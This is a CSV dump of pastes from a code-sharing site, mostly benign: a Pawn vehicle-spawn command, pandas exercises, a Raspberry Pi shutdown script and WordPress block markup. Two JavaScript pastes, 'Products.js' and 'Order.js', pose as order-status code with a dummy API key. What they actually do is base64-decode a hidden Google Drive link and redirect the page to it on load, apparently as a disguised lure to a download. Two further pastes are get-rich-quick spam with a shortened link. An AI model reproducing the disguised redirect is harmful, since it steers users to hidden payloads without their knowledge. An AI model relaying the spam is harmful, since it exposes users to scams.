id,title,username,language,date,content
HEJcGriS,Vehicle spawner for Stars And Stripes Multiplayer.,Joey_Simmons,Pawn,Friday 18th of April 2025 01:04:20 PM CDT,"#include <a_samp>
#include <zcmd>
#include <sscanf2>

CMD:vehicle(playerid, params[])
{
    if(!IsPlayerAdmin(playerid))
    {
        SendClientMessage(playerid, 0xFF0000FF, ""Error: You must be an RCON admin to use this command!"");
        return 1;
    }

    new vehicleid;
    if(sscanf(params, ""i"", vehicleid))
    {
        SendClientMessage(playerid, 0xFFFF00FF, ""Usage: /vehicle [vehicle_id]"");
        SendClientMessage(playerid, 0xFFFF00FF, ""Valid IDs: 15065-15536, 20000-20528"");
        return 1;
    }

    new bool:isValid = (vehicleid >= 15065 && vehicleid <= 15536) || (vehicleid >= 20000 && vehicleid <= 20528);
    switch(isValid)
    {
        case true:
        {
            new Float:x, Float:y, Float:z, Float:angle;
            GetPlayerPos(playerid, x, y, z);
            GetPlayerFacingAngle(playerid, angle);
            new veh = CreateVehicle(vehicleid, x + 4.0, y + 4.0, z + 2.0, angle, -1, -1, 600);
            if(veh != INVALID_VEHICLE_ID)
            {
                SetVehicleZAngle(veh, angle);
                SetPlayerHealth(playerid, 100.0);
                PutPlayerInVehicle(playerid, veh, 0);
                new string[128];
                format(string, sizeof(string), ""You have spawned vehicle ID %d."", vehicleid);
                SendClientMessage(playerid, 0x00FF00FF, string);
            }
            else
            {
                SendClientMessage(playerid, 0xFF0000FF, ""Error: Failed to spawn vehicle! Invalid ID or server limit reached."");
            }
        }
        case false:
        {
            SendClientMessage(playerid, 0xFF0000FF, ""Error: Invalid vehicle ID! Valid IDs: 15065-15536, 20000-20528"");
        }
    }

    return 1;
}"
CGVcz8fu,EARN $900 INSTANTLY 2025 XH,bart22,JavaScript,Friday 18th of April 2025 12:52:25 PM CDT," 
Pdf https://tinyurl.com/privguidee


bXaDJ5AEVT
"
SEDi8UPz,Products.js,dentira,JavaScript,Friday 18th of April 2025 12:51:40 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51540/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EEBMESuA,database_C2,Korotkodul,Python,Friday 18th of April 2025 12:50:16 PM CDT,"import os
import pandas as pd
import kagglehub
import numpy as np
import warnings

warnings.filterwarnings(""ignore"", category=DeprecationWarning)

# Полная настройка отображения DataFrame
pd.set_option('display.max_columns', None)  # Все колонки
pd.set_option('display.expand_frame_repr', False)  # Не переносить на новую строку
pd.set_option('display.width', 1000)  # Ширина вывода
pd.set_option('display.max_colwidth', 20)  # Максимальная ширина колонки


path = kagglehub.dataset_download(""ersany/online-retail-dataset"")
df = pd.read_excel(os.path.join(path, ""Online Retail.xlsx""))

""""""
Поиск акул рынка
1)Постройте отдельную таблицу пкупатель - число заказов ['CustomerID', 'NumOrders']
2)Найдите самых активных (число заказов больше, чем у 95% всех покупателей)
Из основной таблицы выберете только информацию о наших акулах
3)Для каждого подсчитайте, сколько суммарно в каждой из стран было потрачено $ (оформить в виде таблицы с колонками CustomerID и нразваниями стран)
4)Найти гениев, которые покупали в нескольких странах
(подсказка: unstack, reset_index, columns.name = None)
""""""

print(# Можно применять разные функции к разным колонкам
df.head())
""""""
  InvoiceNo StockCode          Description  Quantity         InvoiceDate  UnitPrice  CustomerID         Country
0    536365    85123A  WHITE HANGING HE...         6 2010-12-01 08:26:00       2.55     17850.0  United Kingdom
1    536365     71053  WHITE METAL LANTERN         6 2010-12-01 08:26:00       3.39     17850.0  United Kingdom
2    536365    84406B  CREAM CUPID HEAR...         8 2010-12-01 08:26:00       2.75     17850.0  United Kingdom
3    536365    84029G  KNITTED UNION FL...         6 2010-12-01 08:26:00       3.39     17850.0  United Kingdom
4    536365    84029E  RED WOOLLY HOTTI...         6 2010-12-01 08:26:00       3.39     17850.0  United Kingdom
""""""
def task3(df):
    num_orders = df.groupby('CustomerID')['InvoiceNo'].nunique().reset_index()
    num_orders.columns = ['CustomerID', 'NumOrders']
    threshold = num_orders['NumOrders'].quantile(0.95)
    sharks = num_orders[num_orders['NumOrders'] > threshold]
    print(""SHARKS"")
    print(sharks)
    print()
    df_sharks_info = pd.merge(df, sharks, on='CustomerID', how='inner')
    print(""DF_SHARKS_INFO"")
    print(df_sharks_info)
    print()
    df_sharks_info['TotalSpent'] = df_sharks_info['Quantity'] * df_sharks_info['UnitPrice']


    #Для каждого подсчитайте, сколько суммарно в каждой из стран было потрачено $ (оформить в виде таблицы с колонками CustomerID и нразваниями стран)
    spent_per_country = df_sharks_info.pivot_table(
        index='CustomerID',
        columns='Country',
        values='TotalSpent',
        aggfunc='sum',
        fill_value=0
    ).reset_index().rename_axis(None, axis=1)

    #Найти гениев, которые покупали в нескольких странах
    spent_per_country['NonZeroCount'] = (spent_per_country.drop('CustomerID', axis=1) != 0).sum(axis=1)
    print(""spent_per_country"")
    print(spent_per_country)
    print()
    bought_in_several_countries = spent_per_country[spent_per_country['NonZeroCount'] > 1]
    print(""bought_in_several_countries"")
    print(bought_in_several_countries)
    print()
    bought_in_several_countries_id = bought_in_several_countries['CustomerID']
    print(""bought_in_several_countries_id"")
    print(type(bought_in_several_countries_id))
    print(bought_in_several_countries_id)
    print()


task3(df)"
RiDjpLb2,Untitled,DuboisP,Python,Friday 18th of April 2025 12:44:19 PM CDT,"import RPi.GPIO as GPIO
import subprocess
import time
import datetime
import os

GPIO.setmode(GPIO.BCM)  # use GPIO numbering
GPIO.setwarnings(False)

INT = 6  # GPIO button interrupt to shutdown procedure
# use a weak pull_up to create a high
GPIO.setup(INT, GPIO.IN)
GPIO.setup(19, GPIO.OUT)
GPIO.setup(13, GPIO.OUT)

def EcrisLog(montxt):
    if ""#"" in montxt:
        temps = montxt
    else:
        temps = str(datetime.datetime.today())
        temps += montxt
        fichier = open(""/home/pi/ArretRaspi/arretraspi.log"", ""a"")
        fichier.write(temps)
        fichier.close()

def main():
    while True:
        EcrisLog(""####### Reboot ###########\n"")
        EcrisLog(""\tDemarrre prg Arretraspi.py\n"")
        GPIO.waitforedge(INT, GPIO.RISING)
        if GPIO.input(INT) == 1:
            EcrisLog(""\tArret OpenCPN\n"")
            os.system(""pkill opencpn"")
            time.sleep(5)
            EcrisLog(""\tMise a L'etat haut\n"")
            GPIO.output(19, GPIO.HIGH)
            GPIO.output(13, GPIO.HIGH)
            time.sleep(10)
            EcrisLog(""\tMise a l'etat bas\n"")
            GPIO.output(19, GPIO.LOW)
            GPIO.output(13, GPIO.LOW)

if __name__ == '__main__':
    main()
"
7M5bCn6v,database_C1,Korotkodul,Python,Friday 18th of April 2025 12:42:33 PM CDT,"import os
import pandas as pd
import kagglehub
import numpy as np
import warnings

warnings.filterwarnings(""ignore"", category=DeprecationWarning)

# Полная настройка отображения DataFrame
pd.set_option('display.max_columns', None)  # Все колонки
pd.set_option('display.expand_frame_repr', False)  # Не переносить на новую строку
pd.set_option('display.width', 1000)  # Ширина вывода
pd.set_option('display.max_colwidth', 20)  # Максимальная ширина колонки


path = kagglehub.dataset_download(""ersany/online-retail-dataset"")
df = pd.read_excel(os.path.join(path, ""Online Retail.xlsx""))

""""""
Поиск акул рынка
1)Постройте отдельную таблицу пкупатель - число заказов ['CustomerID', 'NumOrders']
2)Найдите самых активных (число заказов больше, чем у 95% всех покупателей)
Из основной таблицы выберете только информацию о наших акулах
3)Для каждого подсчитайте, сколько суммарно в каждой из стран было потрачено $ (оформить в виде таблицы с колонками CustomerID и нразваниями стран)
4)Найти гениев, которые покупали в нескольких странах
(подсказка: unstack, reset_index, columns.name = None)
""""""

print(# Можно применять разные функции к разным колонкам
df.head())
""""""
  InvoiceNo StockCode          Description  Quantity         InvoiceDate  UnitPrice  CustomerID         Country
0    536365    85123A  WHITE HANGING HE...         6 2010-12-01 08:26:00       2.55     17850.0  United Kingdom
1    536365     71053  WHITE METAL LANTERN         6 2010-12-01 08:26:00       3.39     17850.0  United Kingdom
2    536365    84406B  CREAM CUPID HEAR...         8 2010-12-01 08:26:00       2.75     17850.0  United Kingdom
3    536365    84029G  KNITTED UNION FL...         6 2010-12-01 08:26:00       3.39     17850.0  United Kingdom
4    536365    84029E  RED WOOLLY HOTTI...         6 2010-12-01 08:26:00       3.39     17850.0  United Kingdom
""""""
def task3(df):
    num_orders = df.groupby('CustomerID')['InvoiceNo'].nunique().reset_index()
    num_orders.columns = ['CustomerID', 'NumOrders']
    threshold = num_orders['NumOrders'].quantile(0.95)
    sharks = num_orders[num_orders['NumOrders'] > threshold]
    print(""SHARKS"")
    print(sharks)
    print()
    df_sharks_info = pd.merge(df, sharks, on='CustomerID', how='inner')
    print(""DF_SHARKS_INFO"")
    print(df_sharks_info)
    print()
    df_sharks_info['TotalSpent'] = df_sharks_info['Quantity'] * df_sharks_info['UnitPrice']


    #Для каждого подсчитайте, сколько суммарно в каждой из стран было потрачено $ (оформить в виде таблицы с колонками CustomerID и нразваниями стран)
    spent_per_country = df_sharks_info.pivot_table(
        index='CustomerID',
        columns='Country',
        values='TotalSpent',
        aggfunc='sum',
        fill_value=0
    ).reset_index().rename_axis(None, axis=1)

    #Найти гениев, которые покупали в нескольких странах
    #spent_per_country['non_zero_count'] = (spent_per_country != 0).sum(axis=1)
    print(""spent_per_country"")
    print(spent_per_country)


task3(df)"
47YehXtU,Make $1000 15-MINUTES (BEGINNER) 2J,bart22,JavaScript,Friday 18th of April 2025 12:39:00 PM CDT," 
Pdf https://tinyurl.com/privguidee


IZPiVByPPF
"
hyVM6LR2,Order.js,dentira,JavaScript,Friday 18th of April 2025 12:36:18 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05093/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5WM3zLEz,Hover Block Colors,drkskwlkr,JSON,Friday 18th of April 2025 12:34:56 PM CDT,"<!-- wp:greenshift-blocks/row {""id"":""gsbp-dba83b5"",""inlineCssStyles"":""#gspb_row-id-gsbp-dba83b5{justify-content: space-between;margin-top: 0px;margin-bottom: 0px;display: flex;flex-wrap: wrap;}#gspb_row-id-gsbp-dba83b5 \u003e .gspb_row__content {display: flex;justify-content: space-between;margin: 0 auto;width: 100%;flex-wrap: wrap;}.gspb_row{position:relative;}div[id^=gspb_col-id]{box-sizing:border-box;position:relative;}div[id^=gspb_col-id]{padding:var(\u002d\u002dgs-row-column-padding, 15px min(3vw, 20px));}body.gspb-bodyfront #gspb_row-id-gsbp-dba83b5 \u003e .gspb_row__content{max-width:var(\u002d\u002dwp\u002d\u002dstyle\u002d\u002dglobal\u002d\u002dwide-size, 1200px);}"",""align"":""full"",""displayStyles"":false,""isVariation"":""section"",""htmlTag"":""section""} -->
<section class=""wp-block-greenshift-blocks-row alignfull gspb_row gspb_row-id-gsbp-dba83b5"" id=""gspb_row-id-gsbp-dba83b5""><div class=""gspb_row__content""> <!-- wp:greenshift-blocks/row-column {""id"":""gsbp-d0d28d3"",""inlineCssStyles"":""#gspb_col-id-gsbp-d0d28d3.gspb_row__col\u002d\u002d12{width:100%;}@media (max-width: 575.98px){#gspb_col-id-gsbp-d0d28d3.gspb_row__col\u002d\u002d12{width:100%;}}body #gspb_col-id-gsbp-d0d28d3.gspb_row__col\u002d\u002d12{display:flex;flex-direction:row;justify-content:space-around;}"",""flexbox"":{""flexDirection"":[""row""],""type"":""flexbox"",""justifyContent"":[""space-around""]}} -->
<div class=""wp-block-greenshift-blocks-row-column gspb_row__col--12 gspb_col-id-gsbp-d0d28d3"" id=""gspb_col-id-gsbp-d0d28d3""><!-- wp:greenshift-blocks/container {""id"":""gsbp-92465c9"",""inlineCssStyles"":"".gspb_container-id-gsbp-92465c9{flex-direction: column;box-sizing: border-box;}#gspb_container-id-gsbp-92465c9.gspb_container \u003e p:last-of-type{margin-bottom:0}#gspb_container-id-gsbp-92465c9.gspb_container{position:relative;}#gspb_container-id-gsbp-92465c9.gspb_container{display:flex;flex-direction:column;row-gap:24px;}#gspb_container-id-gsbp-92465c9.gspb_container{padding-top:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dspacing\u002d\u002d40);padding-right:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dspacing\u002d\u002d40);padding-bottom:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dspacing\u002d\u002d40);padding-left:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dspacing\u002d\u002d40);}#gspb_container-id-gsbp-92465c9.gspb_container{border-top-left-radius:12px;border-top-right-radius:12px;border-bottom-right-radius:12px;border-bottom-left-radius:12px;}#gspb_container-id-gsbp-92465c9.gspb_container \u003e .gspb_backgroundOverlay{border-top-left-radius:12px;border-top-right-radius:12px;border-bottom-right-radius:12px;border-bottom-left-radius:12px;}#gspb_container-id-gsbp-92465c9.gspb_container:hover{background-image:linear-gradient(180deg,rgb(27,136,237) 0%,rgb(12,86,156) 100%);}#gspb_container-id-gsbp-92465c9.gspb_container{width:300px;}"",""alignSelf"":[null],""flexbox"":{""enable"":false,""flexDirection"":[""column""],""type"":""flexbox"",""gridcolumns"":[1],""rowgap"":[""24px""]},""background"":{""backgroundHoverState"":""Gradient"",""gradientHover"":""linear-gradient(180deg,rgb(27,136,237) 0%,rgb(12,86,156) 100%)""},""border"":{""borderRadius"":{""values"":{""topLeft"":[""12px""],""topRight"":[""12px""],""bottomRight"":[""12px""],""bottomLeft"":[""12px""]},""locked"":true},""style"":[],""size"":[],""color"":[],""styleHover"":[],""sizeHover"":[],""colorHover"":[],""custom"":[],""customEnabled"":[]},""spacing"":{""margin"":{""values"":[],""locked"":false,""usePreset"":true,""presetValueB"":[0]},""padding"":{""values"":[],""locked"":false,""usePreset"":true,""presetValueT"":[3],""presetValueR"":[3],""presetValueB"":[3],""presetValueL"":[3]}},""blockWidth"":{""customWidth"":{""value"":[""300px""]},""customHeight"":{""value"":[]},""widthType"":""custom""},""className"":""gspb-hoverparent-212""} -->
<div class=""wp-block-greenshift-blocks-container gspb_container gspb_container-gsbp-92465c9 gspb-hoverparent-212"" id=""gspb_container-id-gsbp-92465c9""><!-- wp:greenshift-blocks/iconbox {""id"":""gsbp-cc18c9a"",""inlineCssStyles"":""#gspb_iconBox-id-gsbp-cc18c9a svg{width: 72px;}#gspb_iconBox-id-gsbp-cc18c9a{justify-content:center;display:flex;}#gspb_iconBox-id-gsbp-cc18c9a svg, #gspb_iconBox-id-gsbp-cc18c9a svg path{fill:#1B88ED !important;}#gspb_iconBox-id-gsbp-cc18c9a svg{margin:0px !important;}.gspb-hoverparent-212:hover #gspb_iconBox-id-gsbp-cc18c9a svg, .gspb-hoverparent-212:hover #gspb_iconBox-id-gsbp-cc18c9a svg path{fill:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dcolor\u002d\u002dinputbg, #fafbfd) !important;}#gspb_iconBox-id-gsbp-cc18c9a .gspb_iconBox__wrapper{margin-bottom:0px;}"",""spacing"":{""margin"":{""values"":{""bottom"":[""0px""]},""locked"":false},""padding"":{""values"":{},""locked"":false}},""iconBox_icon"":{""icon"":{""font"":""rhicon rhi-paper-plane"",""svg"":""\u003csvg xmlns=\u0022http://www.w3.org/2000/svg\u0022 width=\u0022200\u0022 height=\u0022200\u0022 viewBox=\u00220 0 256 256\u0022\u003e\u003cpath fill=\u0022currentColor\u0022 d=\u0022m114.34 154.34l96-96a8 8 0 0 1 11.32 11.32l-96 96a8 8 0 0 1-11.32-11.32M128 88a63.9 63.9 0 0 1 20.44 3.33a8 8 0 1 0 5.11-15.16a80 80 0 0 0-105.06 84.71a8 8 0 0 0 7.94 7.12c.29 0 .59 0 .89-.05a8 8 0 0 0 7.07-8.83A64.92 64.92 0 0 1 64 152a64.07 64.07 0 0 1 64-64m99.74 13a8 8 0 0 0-14.24 7.3a96.27 96.27 0 0 1 5 75.71l-181.1-.07A96.24 96.24 0 0 1 128 56h.88a95 95 0 0 1 42.82 10.5a8 8 0 1 0 7.3-14.23a112 112 0 0 0-156.66 137A16.07 16.07 0 0 0 37.46 200h181.07a16 16 0 0 0 15.11-10.71a112.35 112.35 0 0 0-5.9-88.3Z\u0022/\u003e\u003c/svg\u003e"",""image"":""""},""fill"":""#1B88ED"",""fillhover"":""var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dcolor\u002d\u002dinputbg, #fafbfd)"",""type"":""svg"",""relativeHover"":true,""hoverClass"":""gspb-hoverparent-212""}} -->
<div class=""wp-block-greenshift-blocks-iconbox gspb_iconBox gspb_iconBox-id-gsbp-cc18c9a"" id=""gspb_iconBox-id-gsbp-cc18c9a""><div class=""gspb_iconBox__wrapper"" style=""display:inline-flex""><svg xmlns=""http://www.w3.org/2000/svg"" style=""width:5rem;height:5rem;margin:10px"" width=""200"" height=""200"" viewBox=""0 0 256 256""><path fill=""currentColor"" d=""m114.34 154.34l96-96a8 8 0 0 1 11.32 11.32l-96 96a8 8 0 0 1-11.32-11.32M128 88a63.9 63.9 0 0 1 20.44 3.33a8 8 0 1 0 5.11-15.16a80 80 0 0 0-105.06 84.71a8 8 0 0 0 7.94 7.12c.29 0 .59 0 .89-.05a8 8 0 0 0 7.07-8.83A64.92 64.92 0 0 1 64 152a64.07 64.07 0 0 1 64-64m99.74 13a8 8 0 0 0-14.24 7.3a96.27 96.27 0 0 1 5 75.71l-181.1-.07A96.24 96.24 0 0 1 128 56h.88a95 95 0 0 1 42.82 10.5a8 8 0 1 0 7.3-14.23a112 112 0 0 0-156.66 137A16.07 16.07 0 0 0 37.46 200h181.07a16 16 0 0 0 15.11-10.71a112.35 112.35 0 0 0-5.9-88.3Z""></path></svg></div></div>
<!-- /wp:greenshift-blocks/iconbox -->

<!-- wp:greenshift-blocks/text {""id"":""gsbp-50ddc74"",""inlineCssStyles"":"".gspb_text-id-gsbp-50ddc74{font-size:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dfont-size\u002d\u002dlarge) !important;}.gspb_text-id-gsbp-50ddc74{color:#1B88ED;}.gspb-hoverparent-212:hover .gspb_text-id-gsbp-50ddc74{color:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dcolor\u002d\u002dinputbg, #fafbfd);}"",""textContent"":""Lorem Ipsum"",""typography"":{""textShadow"":[],""themeFontsizePresetEnable"":true,""themeFontsizePreset"":""large"",""colorHover"":""var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dcolor\u002d\u002dinputbg, #fafbfd)"",""relativeHover"":true,""hoverClass"":""gspb-hoverparent-212"",""color"":""#1B88ED""},""metadata"":{""name"":""Title""}} -->
<div id=""gspb_text-id-gsbp-50ddc74"" class=""gspb_text gspb_text-id-gsbp-50ddc74 "">Lorem Ipsum</div>
<!-- /wp:greenshift-blocks/text -->

<!-- wp:greenshift-blocks/text {""id"":""gsbp-baae3e0"",""inlineCssStyles"":"".gspb_text-id-gsbp-baae3e0{color:#1B88ED;}.gspb-hoverparent-212:hover .gspb_text-id-gsbp-baae3e0{color:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dcolor\u002d\u002dinputbg, #fafbfd);}.gspb_text-id-gsbp-baae3e0{margin-bottom:0px!important;}"",""textContent"":""Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commo"",""spacing"":{""margin"":{""values"":{""bottom"":[""0px""]},""locked"":false},""padding"":{""values"":[],""locked"":false}},""typography"":{""textShadow"":[],""colorHover"":""var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dcolor\u002d\u002dinputbg, #fafbfd)"",""relativeHover"":true,""hoverClass"":""gspb-hoverparent-212"",""color"":""#1B88ED""},""metadata"":{""name"":""Subtitle""}} -->
<div id=""gspb_text-id-gsbp-baae3e0"" class=""gspb_text gspb_text-id-gsbp-baae3e0 "">Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commo</div>
<!-- /wp:greenshift-blocks/text --></div>
<!-- /wp:greenshift-blocks/container -->

<!-- wp:greenshift-blocks/container {""id"":""gsbp-5804ec2"",""inlineCssStyles"":"".gspb_container-id-gsbp-5804ec2{flex-direction: column;box-sizing: border-box;}#gspb_container-id-gsbp-5804ec2.gspb_container \u003e p:last-of-type{margin-bottom:0}#gspb_container-id-gsbp-5804ec2.gspb_container{position:relative;}#gspb_container-id-gsbp-5804ec2.gspb_container{display:flex;flex-direction:column;row-gap:24px;}#gspb_container-id-gsbp-5804ec2.gspb_container{padding-top:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dspacing\u002d\u002d40);padding-right:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dspacing\u002d\u002d40);padding-bottom:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dspacing\u002d\u002d40);padding-left:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dspacing\u002d\u002d40);}#gspb_container-id-gsbp-5804ec2.gspb_container{border-top-left-radius:12px;border-top-right-radius:12px;border-bottom-right-radius:12px;border-bottom-left-radius:12px;}#gspb_container-id-gsbp-5804ec2.gspb_container \u003e .gspb_backgroundOverlay{border-top-left-radius:12px;border-top-right-radius:12px;border-bottom-right-radius:12px;border-bottom-left-radius:12px;}#gspb_container-id-gsbp-5804ec2.gspb_container:hover{background-image:linear-gradient(180deg,rgb(27,136,237) 0%,rgb(12,86,156) 100%);}#gspb_container-id-gsbp-5804ec2.gspb_container{width:300px;}"",""alignSelf"":[null],""flexbox"":{""enable"":false,""flexDirection"":[""column""],""type"":""flexbox"",""gridcolumns"":[1],""rowgap"":[""24px""]},""background"":{""backgroundHoverState"":""Gradient"",""gradientHover"":""linear-gradient(180deg,rgb(27,136,237) 0%,rgb(12,86,156) 100%)""},""border"":{""borderRadius"":{""values"":{""topLeft"":[""12px""],""topRight"":[""12px""],""bottomRight"":[""12px""],""bottomLeft"":[""12px""]},""locked"":true},""style"":[],""size"":[],""color"":[],""styleHover"":[],""sizeHover"":[],""colorHover"":[],""custom"":[],""customEnabled"":[]},""spacing"":{""margin"":{""values"":[],""locked"":false,""usePreset"":true,""presetValueB"":[0]},""padding"":{""values"":[],""locked"":false,""usePreset"":true,""presetValueT"":[3],""presetValueR"":[3],""presetValueB"":[3],""presetValueL"":[3]}},""blockWidth"":{""customWidth"":{""value"":[""300px""]},""customHeight"":{""value"":[]},""widthType"":""custom""},""className"":""gspb-hoverparent-212""} -->
<div class=""wp-block-greenshift-blocks-container gspb_container gspb_container-gsbp-5804ec2 gspb-hoverparent-212"" id=""gspb_container-id-gsbp-5804ec2""><!-- wp:greenshift-blocks/iconbox {""id"":""gsbp-214789f"",""inlineCssStyles"":""#gspb_iconBox-id-gsbp-214789f svg{width: 72px;}#gspb_iconBox-id-gsbp-214789f{justify-content:center;display:flex;}#gspb_iconBox-id-gsbp-214789f svg, #gspb_iconBox-id-gsbp-214789f svg path{fill:#1B88ED !important;}#gspb_iconBox-id-gsbp-214789f svg{margin:0px !important;}.gspb-hoverparent-212:hover #gspb_iconBox-id-gsbp-214789f svg, .gspb-hoverparent-212:hover #gspb_iconBox-id-gsbp-214789f svg path{fill:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dcolor\u002d\u002dinputbg, #fafbfd) !important;}#gspb_iconBox-id-gsbp-214789f .gspb_iconBox__wrapper{margin-bottom:0px;}"",""spacing"":{""margin"":{""values"":{""bottom"":[""0px""]},""locked"":false},""padding"":{""values"":{},""locked"":false}},""iconBox_icon"":{""icon"":{""font"":""rhicon rhi-paper-plane"",""svg"":""\u003csvg xmlns=\u0022http://www.w3.org/2000/svg\u0022 width=\u0022200\u0022 height=\u0022200\u0022 viewBox=\u00220 0 256 256\u0022\u003e\u003cpath fill=\u0022currentColor\u0022 d=\u0022m114.34 154.34l96-96a8 8 0 0 1 11.32 11.32l-96 96a8 8 0 0 1-11.32-11.32M128 88a63.9 63.9 0 0 1 20.44 3.33a8 8 0 1 0 5.11-15.16a80 80 0 0 0-105.06 84.71a8 8 0 0 0 7.94 7.12c.29 0 .59 0 .89-.05a8 8 0 0 0 7.07-8.83A64.92 64.92 0 0 1 64 152a64.07 64.07 0 0 1 64-64m99.74 13a8 8 0 0 0-14.24 7.3a96.27 96.27 0 0 1 5 75.71l-181.1-.07A96.24 96.24 0 0 1 128 56h.88a95 95 0 0 1 42.82 10.5a8 8 0 1 0 7.3-14.23a112 112 0 0 0-156.66 137A16.07 16.07 0 0 0 37.46 200h181.07a16 16 0 0 0 15.11-10.71a112.35 112.35 0 0 0-5.9-88.3Z\u0022/\u003e\u003c/svg\u003e"",""image"":""""},""fill"":""#1B88ED"",""fillhover"":""var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dcolor\u002d\u002dinputbg, #fafbfd)"",""type"":""svg"",""relativeHover"":true,""hoverClass"":""gspb-hoverparent-212""}} -->
<div class=""wp-block-greenshift-blocks-iconbox gspb_iconBox gspb_iconBox-id-gsbp-214789f"" id=""gspb_iconBox-id-gsbp-214789f""><div class=""gspb_iconBox__wrapper"" style=""display:inline-flex""><svg xmlns=""http://www.w3.org/2000/svg"" style=""width:5rem;height:5rem;margin:10px"" width=""200"" height=""200"" viewBox=""0 0 256 256""><path fill=""currentColor"" d=""m114.34 154.34l96-96a8 8 0 0 1 11.32 11.32l-96 96a8 8 0 0 1-11.32-11.32M128 88a63.9 63.9 0 0 1 20.44 3.33a8 8 0 1 0 5.11-15.16a80 80 0 0 0-105.06 84.71a8 8 0 0 0 7.94 7.12c.29 0 .59 0 .89-.05a8 8 0 0 0 7.07-8.83A64.92 64.92 0 0 1 64 152a64.07 64.07 0 0 1 64-64m99.74 13a8 8 0 0 0-14.24 7.3a96.27 96.27 0 0 1 5 75.71l-181.1-.07A96.24 96.24 0 0 1 128 56h.88a95 95 0 0 1 42.82 10.5a8 8 0 1 0 7.3-14.23a112 112 0 0 0-156.66 137A16.07 16.07 0 0 0 37.46 200h181.07a16 16 0 0 0 15.11-10.71a112.35 112.35 0 0 0-5.9-88.3Z""></path></svg></div></div>
<!-- /wp:greenshift-blocks/iconbox -->

<!-- wp:greenshift-blocks/text {""id"":""gsbp-8ef6f31"",""inlineCssStyles"":"".gspb_text-id-gsbp-8ef6f31{font-size:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dfont-size\u002d\u002dlarge) !important;}.gspb_text-id-gsbp-8ef6f31{color:#1B88ED;}.gspb-hoverparent-212:hover .gspb_text-id-gsbp-8ef6f31{color:var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dcolor\u002d\u002dinputbg, #fafbfd);}"",""textContent"":""Lorem Ipsum"",""typography"":{""textShadow"":[],""themeFontsizePresetEnable"":true,""themeFontsizePreset"":""large"",""colorHover"":""var(\u002d\u002dwp\u002d\u002dpreset\u002d\u002dcolor\u002d\u002dinputbg, #fafbfd)"",""relativeHover"":true,""hoverClass"":""gspb-hoverparent-212"",""color"":""#1B88ED""},""metadata"":{""name"":""Title""}} -->
<div id=""gspb_text-id-gsbp-8ef6f31"" class=""gspb_text gspb_text-id-gsbp-8ef6f31 "">Lorem Ipsum</div>
<!-- /wp:greenshift-blocks/text -->

